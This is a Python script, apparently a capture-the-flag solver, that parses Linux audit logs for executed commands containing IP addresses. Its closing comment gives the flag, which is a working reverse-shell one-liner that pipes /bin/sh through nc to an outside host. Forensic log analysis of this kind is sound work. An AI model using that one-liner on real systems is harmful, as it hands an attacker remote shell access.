import os
import re

CHALL = "../../challfiles/socrate/linux/"
IPV4_PATTERN = r'\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'

logs = os.listdir(CHALL)

with open('./command_history.txt', 'w') as out:
    for log in logs:
        with open(f'{CHALL}{log}') as f:
            for line in f:
                if "type=EXECVE" in line:
                    try:
                        raw_args = line.split()[3:]
                        argc = int(raw_args[0].split('=')[1])
                        args = ' '.join([i.split("=")[1].strip('"') if i[-1] == '"' else '"' + bytes.fromhex(i.split("=")[1]).decode() + '"' for i in raw_args[1:]])
                        
                        if re.search(IPV4_PATTERN, args):
                            print(f"{log}: {args}")
                            out.write(f"{log}: {args}")
                    except Exception as e:
                        pass

# FCSC{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50011 >/tmp/f}